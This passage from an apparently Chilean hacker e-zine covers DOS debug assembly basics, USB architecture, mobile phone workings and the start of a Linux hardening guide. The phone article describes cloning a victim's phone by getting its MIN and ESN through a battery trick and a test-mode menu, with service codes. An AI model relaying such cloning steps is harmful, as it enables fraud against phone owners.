Y que  mas sobre la CPU ?....uhmmmm....bueno, aclarare algunas cosas como  las
interrupciones y excepciones.

Y  que  es una interrupcion ? Pues es una llamada a una rutina  provocada  por
algun  hecho  externo  (por el hardware)  o  por una instruccion del  programa
(bueno,  esa es la intruccion INT). Una excepcion es generada  automaticamente
por un acontecimiento anormal, como por ejemplo una instruccion no valida, una
operacion imposible (como dividir por 0), etc.

En  todo caso, estos dos provocan una interrupcion del programa en  ejecucion,
por lo que se guardan automaticamente en la pila las direcciones de la proxima
instruccion   a   ejecutar ( la  que  estaba  antes   de  que sea  llamada  la
interrupcion).

Las interrupciones provocadas por hardware son aquellas que activan los  pines
NMI e INTR.

NMI  es la interrupcion no enmascareble, o sea, que siempre sera atendida  por
la  CPU,   por lo que se reserva para situaciones muy importantes (errores  de
memoria,  perdida   de   energia,   etc).   En  cambio INTR es la peticion  de
interrupcion  enmascarable,  que sera aceptada si en el registro de estado, el
bit IF esta activado. Aqui es por donde los dispositivos de hardware hacen sus
peticiones  de interrupcion (¨? que no te acuerdas de los IRQ)  para  que  sean
atendidos por la CPU.


Las  interrupciones provocadas por software son aquellas que se llaman  en  el
programa   por   medio   de   la instruccion INT. Mediante ella accederemos  a
funciones del sistema operativo y de la BIOS, para que al momento de programar
no  tengamos que manejar a muy bajo nivel el computador.   Asi,  el manejo  de
archivos  o imprimir en pantalla nos puede ser muy dificil si no tuvieramos  a
disposicion las funciones del MS-DOS y de la BIOS.

Los principales servicios del MS-DOS se encuentran en la interrupcion 21h,  el
cual  posee muuuuuuuuchas funciones y con la interrupcion 20h damos termino  a
un programa......bueno eso lo veremos con mayor detalle despues.


     INTRODUCCION A LA PROGRAMACION EN ENSAMBLADOR

Por   fin   diran  muchos, jeje..... pero bueno... .ojala tengas claro todo lo
anterior para poder seguir. Ahora veremos la sintaxis de una   instruccion  en
ensamblador.   Esta   constara  de  dos partes: el nombre o "nemonico"  de  la
instruccion propiamente tal y sus parametros, que por lo general son   destino
y fuente:

                    INSTRUCCION  DESTINO, FUENTE

Incluso  destino  y  fuente pueden ser el mismo. Tambien hay instrucciones que
poseen un solo argumento u otros que no poseen ninguno:

                    INSTRUCCION DESTINO           o bien

                    INSTRUCCION

    Veamos un ejemplo:

                    MOV AL, 4A
                    MOV BL, 23
                    ADD AL, BL

Explicacion:  la instruccion MOV copia la fuente al destino, asi el valor  4Ah
se  copia al  registro AX en la parte baja (AL:los 8 bits menos significativos
de AX),   el   valor   23h se copia tambien a la parte baja de BX y luego   la
instruccion   ADD (que suma la fuente y el destino y guarda el resultado en el
destino)   suma AL y BL (que contienen 4Ah y 23h respectivamente) y  guarda el
resultado en AL, por lo que AL = 4Ah + 23h = 6Dh.

Asi ya sabemos dos instrucciones: con MOV copiamos datos y con ADD sumamos.

Esto   de  co locar el valor que queremos  copiar directamente en la fuente se
conoce  como "direccionamiento  inmediato".  Otra forma de colocar un valor es
indicando la direccion de memoria donde se encuentra esta. Esto se conoce como
"direccionamiento directo" y se usan los []:

                   INSTRUCCION DESTINO, [DIRECC_DE_FUENTE]

    Por ejemplo:

                MOV AX, [23AD]

Asi,  copiamos el valor que hay en la direccion 23ADh en el registro AX. Si no
se le dan otros parametros, se asume por defecto que la direccion es  DS:23AD.
En todo caso, tambien se puede indicar un registro de segmento especifico:

                MOV AX, ES:[23AD]

Otra   forma  de    direccionamiento es, en vez de indicar  explicitamente  la
direccion de memoria, se¤alar un registro que de la direccion de memoria donde
esta el dato. Esto es lo que se conoce como "direccionamiento indirecto" y  su
sintaxis es:

                MOV AX, [SI]

Aqui se puede usar un registro indice (SI, DI) o un registro base  (BP,   BX),
teniendo  en  cuenta  que para SI, DI y BX se toma por defecto el registro  de
segmento DS  para obtener la direccion, en cambio BP su registro  de  segmento
por defecto es SS, a menos que se especifique:

                MOV DX, ES:[DI]

asi,   la direccion de este ejemplo sera ES*16+DI, donde se encontrara el dato
que se guarde en DX.

Bueno, hay mas formas de direccionamiento, pero lo veremos mas adelante cuando
sea necesario. Uhmmmm....ya es hora de hacer algo util...

Pero que programa utilizamos para programar en ensamblador ? Bueno, estan MASM,
TASM...... y  el  debug de MS-DOS. Si, lo trae el MS-DOS, pero aunque es  algo
limitado, sera  el que utilizaremos por lo menos en esta  primera  parte  para
introducirnos  en  este lenguaje. Asi que voy a explicar un poco su  forma  de
utilizarlo.

   -El Debug

Para  ejecutarlo tan solo tienes que escribir debug en el simbolo del sistema.
Ahora, si quieres cargar un ejecutable, para analizarlo con el debug, tan solo
coloca el archivo como argumento.

Una vez  adentro te presenta un "-" (sin las comillas). Aqui puedes introducir
comandos (que son solo letras). Para ver la ayuda escribe ? y enter.

    Los pricipales comandos son:

    U <direccion> : con este comado desensamblamos, es decir, nos presenta
                    las instrucciones en ensamblador a partir de la direccion
                    que le especifiquemos. Sin parametros, nos presenta el
                    contenido a partir del offset 100h. Este comando siempre
                    nos presentara en pantalla solo 32 bytes, y si seguimos
                    utilizandolo sin paramentros, nos muestra los 32 bytes
                    siguientes. Algo asi:

                     -u (enter)
                     132F:0100  E90A0F  JMP 100D
                     132F:0103  0E      PUSH CS
                     132F:0104  1F      POP DS
                     132F:0105  0E      PUSH CS
                     132F:0106  .......           (y sigue hasta completar
                     ..................            los 32 bytes)
                     132F:011E  7307    JNB 0127  
                     -

                       Si te fijas, como primera columna aparece la direccion
                    de memoria (con el formato segmento:offset) donde empieza
                    el byte de cada instruccion (el segmento lo asignara el
                    OS para nuestro programa). Luego en la segunda columna,
                    aparece los bytes que componen la instruccion y en la
                    tercera columna esta la traduccion de estos bytes a
                    ensamblador.
                       Tambien se le puede decir donde terminar, tan solo hay
                    que escribirlo como parametro adicional:

                    -u 100 10F 

    A <direccion> : Con esta ensamblamos, o sea, nos permite meter en la memo-
                    ria instrucciones en ensamblador, a partir de la direccion
                    que le digamos. Si no le indicamos la direccion, empieza
                    en el offset 100h, o bien en la siguiente posicion de
                    memoria si ya habiamos utilizado este comando antes. Por
                    ejemplo:
                    -a (enter)
                    1356:0100 _     (aqui escribimos las instrucciones).
                    ............    (avanzara automaticamente a las siguientes
                    ............    posiciones de memoria).
                    1356:012F       (y para terminar no escribimos nada, le
                    -                damos al enter).
    G <direccion> : Con esta ejecutamos el programa. Si no se le pasan para-
                    metros, empieza en el segmento:0100.

    E <direccion> <lista> : Con este comando introducimos datos directamente
                   en la direccion que le especifiquemos. Es muy util a la
                   hora de introducir cadenas de caracteres. Si omitimos
                   <lista> solo nos permitira modificar la direccion de
                   memoria especificada, por ejemplo:

                   -e b800:0000 (enter)
                   b800:0000 31._ (nos muestra el contenido de esa posicion,
                                   que es 31h, y nos permite modificarlo, para
                                   eso escribimos el dato en hexadecimal des-
                                   pues del punto).
                   -

                     Ahora, tambien podemos introducir una lista de valores
                   a partir de la direccion que le especifiquemos, tan solo
                   tenemos que separarlo por espacios:

                    -e b800:0000 12 34 A4 5F F8 8D 23 67 34 78 (enter)

                     Tambien se pueden introducir cadenas de caracteres, junto
                   con valores hexadecimales, tan solo a las cadenas hay que
                   ponderlas entre comillas simples ('):

                    -e 105 'Esto es una cadena de caracteres' 34 56 A5 B7

                     No lo habia dicho antes, de que en el campo de la direc-
                   cion tambien se puede indicar solo el offset, y se tomara
                   como por predeterminado el segmento de trabajo.

     T y P        : Estos dos comandos nos permiten ejecutar el programa paso
                   a paso, mostrandonos el estado de los registros de la CPU
                   por cada instruccion. Algo como sigue:

            AX=0000 BX=0000 CX=0000 DX=0000 SP=FFEE BP=0000 SI=0000 DI=0000
            DS=116E ES=116E SS=116E CS=116E IP=102  OV UP EI NG NZ NA PO NC
            116E:0102  B354  MOV BL,54

                   Si te fijas,  aparecen  claramente los  contenidos  de  los
                   registros.   Eso  de  OV UP...  corresponde al registro  de
                   banderas. Ya explicare el significado mas adelante.  En  la
                   tercera   linea  aparece la  instruccion que apunta CS:IP y
                   sera la que se ejecutara en la proximo uso del comando T  o
                   P.  Pero.... que diferencia hay entre T y P ?   En  que  la
                   primera  se  mete  dentro  de  las  subrutinas  y  de   las
                   interrupciones,   en cambio  P  ejecuta las   subrutinas  e
                   interrupciones de golpe.
               
     R <registro> : Solo nos muestra el estado de los registros al igual que
                  los comandos anteriores. Si especificamos un registro en
                  especial, nos permite modificar su contenido:

                    -r cs 
                    CS 3466       (nos muestra el contenido actual)
                    :_            (aqui modificamos el registro, o bien le
                                   damos al enter si no queremos esto).

    ¨ Y como cargamos y guardamos archivos ?

    Para cargar un archivo, ya dentro del debug, tecleamos:
    -n test.com   (con n damos un nombre de archivo)
    -l            (y con l (load) cargamos)

Para guardar hay que tener en cuenta el tama¤o del archivo. Para eso  restamos
la  direccion  inicial  con la final. Por ejemplo si estamos introduciendo  un
programa:

    -a
    1245:0100 mov al,45
    1245:0102 mov bl,67
    ..........       
    1245:012F
    -

tendriamos que restar 12Fh-100h. Bueno, el propio debug nos puede restar, esto
se hace con el comando H:

    -h 12F 100
    022F 02F
    -

La  primera cifra, 22Fh, es la suma de los dos  numeros,  y por supuesto   que
la segunda es la resta, 2Fh. Asi, el programa tiene una longitud de 2Fh bytes.
Es necesario conocer este dato porque   hay que  guardarlo en CX a la hora  de
guardar el archivo, segun lo visto, esto se haria asi:

    -r cx
    CX 0000
    : 2F
    -

y para terminar de guardarlo:

    -n prueba.com       (otra vez, le damos un nombre)
    -w                  (escribimos)
    Escribiendo 2F bytes
    -

    ¨ Y como veo el registro de estado ?
    Como dije, aparece con el comando R o bien al ejecutar el programa paso
a paso. El significado de los bits mas importantes son:

    Acarreo:           Signo:             Interrupciones:
    NC : no hay        PL : positivo      DI : no se aceptan interrupciones
    CY : si hay        NG : negativo      EI : si se aceptan

    Cero:              Sobrepasamiento:   Direccion:
    NZ : no hay        NV : no hay        UP : hacia adelante
    ZR : pues si       OV : si hay        DN : hacia atras

    Podriamos hacer el programa de sumar dos numeros en el debug, para probar
lo visto. Seria algo asi:

   -a
   452F:0100 mov al,4a
   452F:0102 mov bl,23
   452F:0104 add al,bl
   452F:0106 int 20
   452F:0108
   -

Como  se   fijan,  agrege  la  instruccion INT 20. Esta es  la  llamada  a  la
interrupcion 20h de MS-DOS, que sirve para terminar un programa. Esta sera  la
forma que daremos termino  a un programa  y  sera  obligado,  ya   que  si  no
colocamos eso,  el  computador seguira ejecutando el codigo  que  sigue en  la
memoria, que al ser ese contenido cualquier cosa,  podrias  colgar el PC (para
variar).

Podriamos    ejecutarlo  paso  a  paso  con  P,  y asi ver el contenido de los
registros  despues  de ejecutar cada   instruccion.   Antes   de   ejecutar la
instruccion INT 20, puedes fijarte que el contenido de AX vale 4Ah + 23h = 6D. Al
terminar de ejecutar nuestro programa, salira esto: "El programa ha finalizado
con normalidad".

Ahora podriamos hacer el tipico programa de mostrar un texto en pantalla. Para
ello tendriamos que usar una nueva funcion de MS-DOS, esta vez, por medio   de
la interrupcion 21h. Mejor veamos el ejemplo y luego lo explico:

   -a
   452F:0100 jmp 125
   452F:0102
   -e 102 'Hola, esto es un texto de prueba' 0d 0a '$'
   -a 125
   452F:125 mov dx,102
   452F:128 mov ah,09
   452F:12A int 21
   452F:12C int 20
   452F:12E
   -

Explicacion:
Aqui  aparece  una  nueva  instruccion:  JMP,  que sirve para saltar al offset
especificado dentro del segmento. En este caso, se salta a la posicion 452F:125.
Como se explico anteriormente, con el comado E  introducimos  una   cadena  de
caracteres,  precisamente  en  el  offset 102h (la instruccion jmp 125 ocupa 2
bytes a partir de 100h, por eso empieza la cadena en 102h,  si quieres  puedes
fijarte con hacer u 100) aqui estara la cadena que se vera: "Hola, esto es un
texto de prueba". Los valores 0d 0a son simplemente un enter (0dh codigo
ascii es 13) y linea nueva (0ah) para que pase a la siguiente linea. El carac-
ter $ sirve para se¤alar que es el final de la cadena (es un requerimiento de
la funcion que permite visualizar).

Ahi  aparece la interrupcion 21h, que utiliza el valor almacenado en  AH   que
determinara que funcion se utilizara. La funcion 09h de la interrupcion   21h
es  la  desplegara la cadena.   En el registro DX se almacena el offset  donde
empieza la cadena. Y por ultimo se termina con la llamada a la INT 20.

    Ahora podemos guardar el programa:
    -n hola.com
    -h 12E 100
    022E 002E
    -r cx
    CX 0000
    : 2E
    -w

Asi,   lo   podemos  ejecutar  con  G  (o paso a paso con P) o bien ejecutando
directamente el hola.com

Podemos   modificar ligeramente este programa, por ejemplo hacer que se repita
indefinidamente  la   cadena en pantalla. Para eso podemos  utilizar la  misma
instruccion jmp,  de manera que salte siempre a la direccion donde se llama  a
la INT 21:

    -a
    452F:0100 jmp 125
    -e 102 'Esto lo veras en toda tu pantalla $'
    -a 125
    452F:0125 mov dx,102
    452F:0128 mov ah,09
    452F:012A int 21
    452F:012C jmp 12A
    452F:012E int 20
    452F:0130
    -

Y lo guardas como ya sabes. Saque el 0d 0a para que el texto aparezca al  lado
del siguiente. Para parar el bucle presiona CTRL-C.

Tambien podemos hacer que la cadena se repita solo unas cuantas veces.
Para   eso   habra  que  introducir otras  instrucciones, pero mejor veamos el
ejemplo y despues explico:

    -a
    452F:0100 jmp 120
    452F:0102
    -e 102 'Este lo veras 5 veces' 0d 0a '$'
    -a 125
    452F:0120 mov dx, 102    
    452F:0123 mov ah, 09
    452F:0125 mov cx, 05    (ponemos la cantidad de veces que veras el texto)
    452F:0128 int 21
    452F:012A dec cx
    452F:012B jnz 128
    452F:012D int 20
    452F:012F
    -

Aqui   aparecen 2 instrucciones nuevas,   DEC que nos permite disminuir en una
unidad el registro que le indiquemos y JNZ,  una instruccion que hace un salto
a la direccion que le digamos, siempre que ninguna operacion produzca cero.

Si   te  fijas,  he almacenado en CX la cantidad que se repetira la cadena. De
esta forma, cuando el programa haya ejecutado la por primera vez la INT 21, se
disminuira  en  una unidad el registro CX (valdra en ese momento 4),  luego la
instruccion JNZ,  al ver que no se ha producido cero en alguna operacion   (se
fija en el registro de estado si ZF = 1), salta nuevamente donde se  encuentra
la instruccion INT 21 (la cual desplegara el texto nuevamente) y  decrementara
otra  vez   CX  (ahora sera 3) y  seguira sucesivamente hasta  que llege  a  0,
momento  en  cual  ZF = 1  y  la instruccion  JNZ seguira  con   la  siguiente
instruccion, que es el termino del programa.

Bueno, esto seria todo con respecto a la introduccion al  ensamblador,  puesto
que no saco nada con seguir sin antes describir las principales  instrucciones
de  la CPU.  Esto lo dejare para la segunda parte de este articulo,  y   en la
tercera entrega describire las pricipales funciones del MS-DOS y de la BIOS.

Ojala esto que he escrito le sea de utilidad, por lo menos para comprender  un
poco al computador.

Cualquier consulta, queja, error que haya cometido, etc, etc a mi correo,

ndyup@directo.cl

Nos vemos en la proxima entrega de Nokeyz.

eLPAC


-[03. Universal Serial Bus (USB)]---------------------------------[by Reaven]-

El USB tiene  la gran ventaja de poder conectar  gran cantidad de perifericos, 
mediante  un sistema  totalmente Plug & Play que elimina la necesidad de tener 
que  instalar  las tarjetas  adicionales, como  por ejemplo lo que  sucede con 
algunos  scanners , que  necesitan  de  una  tarjeta  controladora  SCSI  como 
conexion propia.

Arquitectura USB
****************

La conexion USB se lleva a cabo por medio de un  sistema bus, que incorpora un 
peque?o  conector  de  cuatro  polos. Esto hace posible la  conexion  al mismo 
tiempo  de hasta 127 dispositivos si no me equivoco. 

Para  los  dispositivos  con  bajo  consumo  de corriente  electrica,  se hace 
inecesario tener una fuente de  alimentacion, ya que los 5v que tiene el cable 
del USB  es suficiente  en la mayoria  de los casos. El USB permite un modo de 
transferencia  en  un ancho  de banda de  12MBps y otro  con un ancho de banda 
menor a 1.5MBps.

Para  las placas base  que no contienen los  chipsets USB, existen tarjetas de 
tipo PCI  que de alguna  manera actualiza a  estas placas para que  vengan con 
conexion USB.

Ahorro en asignacion de recursos
********************************

De  la  misma forma  que  el controlador  bus  SCSI, el  controlador USB  solo 
necesitara una asignacion de recursos (interrupcion IRQ). Con la diferencia  y 
ventaja, de que del USB  estaran colgando hasta 127 dispositivos, con el claro 
ahora en recursos del sistema.						      
								              			
Cuando  nosotros tenemos  pinchada en  un slot  PCI de nuestra placa base, una 
tarjeta  SCSI por  ejemplo, la placa y el sistema le asignan un recurso IRQ al 
bus SCSI. Todas las unidades que dependen de la tarjeta controladora SCSI como 
discos  duros, lector  de cd-rom,  grabadoras,  etc se benefician de esa unica 
asignacion  de  recursos  del  que  goza  la  controladora  SCSI,  sin pedir o 
necesitar  mas  recursos  que estos. Actualmente,  los dispositivos  que estan 
conectados al computador, que  no vienen listos para conexion USB, como mouse, 
teclado, monitor, impresota, etc, tienen asignados un recurso.

Gestion de direxiones de memoria
********************************

+Como gestiona el pc las direxiones de todos los dispositivos que se encuentra 
conectados  al  USB?  Cada  vez  que  se  conecta  el  computador,  todos  los 
dispositivos y terminales conectados al  USB asumen por defecto la direxion #0 
y se  neutralizan  todas las  conexiones de  corriente descendente. Despues de 
este  ajute, el  computador procede a "interrogar" al USB y localiza al primer 
dispositivo USB, por ejemplo, un terminal, que todavia tiene la direxion #0, y 
le  asigna  la  direxion  #2. El  pc  realiza  este  proceso  para  todos  los 
dispositivos  y  terminales a  identificar y les  asigna un numero de direxion 
exclusivo  para cada uno,  hasta que  llegue a su limite (127 perifericos). Al 
mismo  tiempo que  identifica  y asigna  un numero  de direxion  a cada uno de 
ellos, el  computador tambien  determina los controladores que  deben cargarse 
para cada uno de los dispositivos conectados.

Sistemas Operativos y USB
*************************

Microsoft  formo  parte  del  desarrollo  del software que hizo que el sistema 
operativo soportara  los chipsets con USB, agregando controladores especificos 
para la conexion USB.

Windows es compatible  desde el lanzamiento del Service Pack (OSR2) de windows 
95,  aunque  hace  falta  un  controlador  para  dotar  de capacidad USB a las 
antiguas versiones  de windows. Con el lanzamiento de Windows 98  se soluciona 
totalmente  este problema, ya  que ofrece soporte para todos  los dispositivos 
USB, pudiendo ademas a?adirse nuevos dispositivos  con su propio  controlador. 
WinNT 4.0  tiene problemas y limitaciones  cuando se trata de trabajar con los 
dispostivos USB, win2k no tiene este problema.

En linux, tienes  que  tener el kernel 2.2.16  y  bajar el parche que esta  en
www.linux-usb.org  y  dependiendo de lo que se va  a  instalar se recompila el 
kernel, para  un  cd-rom  se tiene que emular  un  SCSI, etc luego de compilar  
el kernel hay que activar los  modulos  (si es que quedaron como modulos), mas 
info en: http://www.linux-usb.org/FAQ.html

Limites del USB
***************

El unico  limite que presenta el USB es que no puede  manipular ancho de banda 
de imagenes  en vivo sin comprimir, ya que ningun  dispositivo USB puede tener 
mas de 6MBps de ancho de banda total.

Las corrientes  de video comprimidas, como de las  camaras de Videoconferencia 
y el MPEG-1, si  son compatibles  con los  estandares del  USB como tambien lo 
son  las imagenes  procedentes de  camaras estaticas. Lo que ocurre con MPEG-2 
es  que  solo  se  puede  utilizar con  el USB, cuando  el  sistema  no  tiene 
demasiados dispositivos  activos. Si se quiere  una calidad de imagen buena se 
le tiene que  asignar los 6MBps,  ya que  la calidad disminuye si se le asigna 
una frecuencia de bits menor.

Beneficios del USB
******************

- Permite una facil expansion de perifericos en el computador
- Tiene un soporte para distintas plataformas
- Reduxion del numero de cables para la conexion

reaven@nokeyz.net  <<<  manda pa  alla las  consultas, o  en  #informatica  de
irc.terra.cl




-[04. Celulares]--------------------------------------------------[by Gin_suK]-
                   

INTRO
*******
En  este  txt voy a hablar sobre  el  funcionamienmto de los celulares  y dare
algunos codigos para entrar a los menus y TB dare una breve rese~a  sobre  los
celulares(en chile), y uno k otro truco espero k lo disfruten

AVISO :
NI  EL   AUTOR DE ESTE DOCUMENTO  NI LOS INTEGRANTES DE ESTA REVISTA SE  HACEN
RESPONSABLES  POR   LO  QUE  TU  PUEDAS  HACER  CON  ESTA  INFORMACION.   ESTA
INFORMACION EXPUESTA ACA ES SOLO CON FINES EDUCATIVOS NO SE PRETENDE INICIAR A
LA ILEGALIDAD NI NADA POR EL ESTILO 

	 
INDICE 
*******
-Breve rese~a de los celulares en chile (muy corta) :)
-El futuro de los celulares
-Funcionamiento (incluye un truquillo sorpresa)
-SORPRESA 
-Despedida 


BRDLC
*******
ups, acorte el titulo ya que me dio la gana TB asi se ve mas ordenado.

Vamos  recordando esos a~os atras de nuestra querida  patria  ahy  por  los 90
cuando el que tenia un 486 era millonario y para tener un telefono de red fija 
habia que   comprarlo valian como  quinientos mil pesos aprox.  Ahy salen  los
celulares en chile la primera compa~ia creo que fue Telefonica  ex   ctc   los
celulares  que   te  davan  eran   del  porte de un ladrillo (de ahy viene  el
sobrenombre que le pusieron).

La se~al  era  pesima (onda si es que lograbas hablar unos 2 minutos  pudiendo
escuchar al  receptor era tu dia de suerte.. jjeej exajere mucho) les doy otro
ejemplo cuando uno salia del  area de cobertura habia que llamar  y  te tenian
que  dar otro numero despues cuando volvias recuperabas el numero antiguo para
que se  vallan fijando despues paso un tiempo(unos a~os)  y llegaron los  cell
marca audiovox eso ya eran mas pasables (esto e tiempo despues saltandome unos
a~os)  en  esos tiempo la compañia bellsouth (96-97)  yo   me  acuerdo en esos
tiempos de  mi infancia (tenia como 11) un plan que me acuerdo costaba como 30
lukas y eran 60 min terrible de caro por ahi por el 1998 llegaron los celulares
nokia ahy  ya  eran mas pasables yo me acuerdo que podias cambiarle el  timbre
(timbre  =  sonido que  produce el celular al recibir una llamada)era la  gran
novedad ahy los celulares estabn mas accesibles para la poblacion.

NOTA: SOLO PUSE ALGUNOS  HECHOS YA QUE SI ES QUE ME HUBIERA METIDO EN DETALLES
SE VUELVE MUY LARGO ESTA  GUIA  (ESPERO MAS ADELANTE HACER UN DOC MAS COMPLETO
SOBRE LOS CELULARES ONDA UNA GUIA ALGO ASI).


EL FUTURO DE LOS CELL
***********************
Bueno  lo k se espera es k  estos   aparatos sean una especie de mini pc en el
cual tu podras comprar atravez de el tb podras hacer transacciones y cosas por
el estilo  ej: pagar el  peaje antes de llegar a el atravez de el cell esto en
parte sera bueno ya k habra + competencia y sera mas barato TB sera una fuente
de economia para el pais bueno no  :)


FUNCIONAMIENTO DE LOS CELL
***************************
Aer partamos por lo basico recordemos los cell son radios kon mas opciones  tu
puedes  oir y hablar  al   mismo tiempo estos aparatos tienen dos numeritos  k
sirven para identificarlos estos numeros son el ESN Y el MIN;

ESN: Electronic serial number es de 32bit
MIN:Mobile identification number

Aora les dare un peke~o ejemplo imaginemos k keremos hacer una llamada seria
asi:
1) Scanea: el cell buska la antena  mas cercana y la se~al 
2) Elige la mejor se~al
3) El cell manda un msg a la antena  en este msg va el MIN, ESN y el numero k
   kieres llamar
4) Verificca lo datos del msg
5) Hablas :P

Aer se~ores  si ustedes se ponen pensar..   Y  k  chucha  puedo hacer con esta
informacion? RESPUESTA: Me suena algo como clonar siiii. eso mismo lo k puedes
hacer es clonar celulares y como kambiandole el MIN y el ESN:

Yo  conosco dos formas dare a conocer un ya que la otra no la manejo del  todo
bien

Esto es basicamente conseguir el MIN y el ESN...  como lo hago?
Tomas  la  bateria del cell de la victima  y en las eskinas bucas  algun  lugar
que sea diferente  ke  el resto de  la  superficie de la  bateria ahi ases con
tinta un  *  o  algo  k  lo  tape  k  kede  bien  pak funke pones la bateria y al
prenderlo   te  deveria salir unos numeros kuaticos(arrays) y despues un  menu
komo el de abajo si esk todo salio bien:

= clear the phone 38#
= displays the ESN 55# 
= test mode programming 01# 
= restart 13# = power off 16# 
= setup 18# = send NAM 34# 
= turn DTMF off 61# ESN 

Solo   puse  algunas opciones ya que son varias este menu se llama  Test  mode
desde aca puedes hacer lo  que se te de la gana.


SORPRESA
*********
Bueno  le puse   asi  a esto ya k no se me ocurio otro titulo aca dare algunos
kodigos   para acceder a programar algunos aspectos del cell y  cosas  por  el
estilo aca va

MODELO: Nokia 6110
*#0000#     = Software version
#746025625# = Con esto paras el simclock es una especie de reloj interno si
              lo paras puedes ahorrar bateria.

MODELO: Philips Diga
*#7489*#    Con esto podras activar uno k otra opcion de seguridad
*#2558*#    Esta opcion esta relacionada con el reloj del cell

DESPEDIDA
**********
Ojala k les haya gutado 
Saludos:
PinkX(por lo buena gente)-piolax-Narkerbyt(grande socio) y a todos los del
team

EN ESPECIAL SALUDO A LA PIKY :) 


SHAO SEÑORES¡¡¡¡¡¡¡
NOS VEMOS EN NOKEYZ N°5

Gin_suK



-[05. Seguridad en Linux]------------------------------------------[by PinkX]-

Introduccion
************

La   informacion es lo  que,  hoy  en  dia, literalmente mueve  al mundo.   El
increible   torrente  de  flujo  de  datos   digitales a traves   de     redes 
computacionales  no  deja  de  sorprendernos. Vivimos en una epoca en que   la 
informacion  propiamente tal  tiene mucho valor: quien maneja la  informacion, 
tiene  el  poder.  Y es por eso que es importante proteger nuestros datos, por
mas insignificante que estos puedan parecer para nosotros.

A  lo  largo  de  estas  paginas no pretendere formar *ckers, ni demostrar mis
escasas  habilidades.  Tampoco soy un experto en seguridad, simplemente quiero
dar  a conocer  algunas  normas,  y  sencillos consejos, que  nos  ayudaran  a
proteger nuestra preciada informacion y privacidad en nuestros Linuxes. 


Seguridad Interna
*****************

Contrariamente  a  lo  que  generalmente  se  piensa,  los mayores riesgos  de
seguridad   generalmente  ocurren  desde  adentro.   Esto es,  descuido de los 
propios  usuarios  y administradores (nosotros, tu, si tu),  errores,   fallas 
humanas que son letales para el sistema.

El  mas  comun  de  estos  errores,  que  generalmente   cometen  los usuarios
inexpertos  y  recien iniciados,  es la utilizacion de la cuenta root: como el
superusuario  tenemos  privilegios  absolutos  sobre  el sistema; archivos  de
configuracion,   programas   esenciales,   procesos,   dispositivos,  etc. Sin
necesidad de tener los atributos necesarios para ello. En otras palabras, como
root  podemos  destruir e inutilizar el sistema con la simple ejecucion de  un
comando.

Por lo tanto, nuestro primer paso a la seguridad es la creacion (y obviamente,
posterior utilizacion) de una cuenta de usuario no root para nosotros  mismos,
a  traves de la cual realizaremos todas nuestras comunes tareas:   navegacion,
enviar  y  recibir  mail,  irc,  escuchar MP3, etc.   La cuenta root deberemos
utilizarla   unica  y  exclusivamente  para  tareas  de mantencion, como lo es
instalacion  y/o  actualizacion  de  programas y configuracion del sistema. De
esta   manera,  nos protegeremos en   gran   parte   de nuestros potenciales e
irreversibles errores que podamos llegar a cometer.

Una  vez  hecho  esto,   debemos ajustar nuestro sistema a las condiciones  de
seguridad interna optimas, ya sea restringiendo los accesos, privilegios, etc.
Si  nuestro  sistema  es  multiusuario  y  tenemos  mas  de  una cuenta, mayor
prioridad se le debe dar a este punto.

Existe   un  archivo  de  configuracion  no muy conocido,  pero bastante util:
login.defs,   que  se   encuentra  en  el  directorio  /etc.  En  el   podemos 
definir  desde  los eventos a loguear en los logins (fallidos o exitosos),  el
acceso a ciertos dispositivos, quienes podran acceder al comando su mascara de
usuario, y una infinidad de otras cosas.

Por   otro  lado,  a  traves  del comando ulimit (bash) podemos restringir los
recursos  disponibles  a  cada usuario, como memoria, cantidad   de   procesos
simultaneos, tama~o de los core, etc.

Por  ultimo,  es  importante  tener  correctamente  configurado  el  logueo de
eventos,  de  forma ordenada, para posterior revision: el daemon syslogd  nos
permite hacer  esto,   el  cual configuramos a traves del archivo  syslog.conf
que, nuevamente, encontramos en el directorio /etc.

Es necesario como administradores de nuestro propio sistema mantener versiones
actualizadas   de   los   progamas   y   servicios presentes en el, mas aun si
proveemos   acceso   a   otros   usuarios; para ello es importante mantenernos
informados  de  las vulnerabilidades descubiertas y parches y  actualizaciones
existentes. Esto lo veremos con mayor detalle mas adelante. 


Seguridad Externa: Primera Parte
*********************************

Hemos visto  algunas de las formas mas simples de asegurar nuestra maquina por
dentro.  Sin embargo, nuestra presencia en Internet denota un potencial riesgo
de seguridad, cada vez mas creciente. Hay quienes puedan llegar a  pensar que,
si su conexion es via modem (como lo es actualmente en la mayoria de los casos
), nuestro sistema no estara completamente expuesto el 100% del tiempo, y  que
es practicamente imposible que alguien conozca nuestra direccion en un momento
determinado,  y mas aun, pueda tener algun tipo de interes en atacar   nuestra
preciada maquina. Pues bien, se encuentran en un gran error: hay quienes    se
dedican completamente a desafiar y comprometer cuanto sistema  les es posible;
y utilizan  esas  maquinas  una  vez  que  les  pertenecen para seguir con sus
ataques hacia otros lados, encubriendo su verdadera identidad. 

Puede que todo esto suene bastante fantasioso, al estilo de una pelicula. Pero
en la practica podemos comprobar lo contrario, que verdaderamente sucede en el
mundo  real. A continuacion describire brevemente un par de herramientas   muy
utiles  a  la  hora de   detectar  posibles intrusiones y diagnosticar nuestro
sistema.

La  primera   de   ellas  es PortSentry, un programa dise~ado para detectar  y
responder  a  escaneos  de  puertos en tiempo real.  Solo  basta instalarlo  y
dejarlo corriendo por  un  tiempo para   obtener sorprendentes   resultados, y
darnos cuenta  de  que  si podemos ser victimas de un ataque. Incluso bajo una
conexion del tipo dial-up. Esta herramienta (estando correctamente configurada
) es capaz  de  reaccionar a  los escaneos  de los cuales podamos ser victimas,
bloqueando y/o  desviando al  atacante  a  traves de  tecnicas que veremos con
profundidad mas adelante, y reportando oportunamente de lo ocurrido.

La segunda herramienta   que mencione se trata de Nmap,  que es,  ironicamente
con respecto al punto anterior, un escaneador de puertos. Pero   mas  alla  de
eso, es una verdadero progama de diagnostico de redes, el cual utilizaremos  a
nuestro propio favor.  De que manera? E scaneando  nuestro host y descubriendo
cuales servicios tenemos actualmente activos.

La  finalidad de esto es, justamente, eliminar aquellos que no utilicemos:  la
mayoria  de  las distribuciones traen, en forma predeterminada, activados  una
serie  de  servicios (daemons) que,  para un computador de uso personal o como
estacion de trabajo casera, no tienen razon de ser, y que no  representan sino
una potencial gran puerta de entrada.

La  mayoria   de  estos  servicios  son  ejecutados  a  traves  de  inetd,  un
super-servidor  de  internet:  la  configuracion  se lleva a cabo a traves del
archivo inetd.conf que, una vez mas, encontraremos en el directorio /etc.

La sintaxis de este archivo es bastante simple y autoexplicatoria, cada  linea
no   comentada  define  un  servicio a ejecutar, indicados estan el nombre del
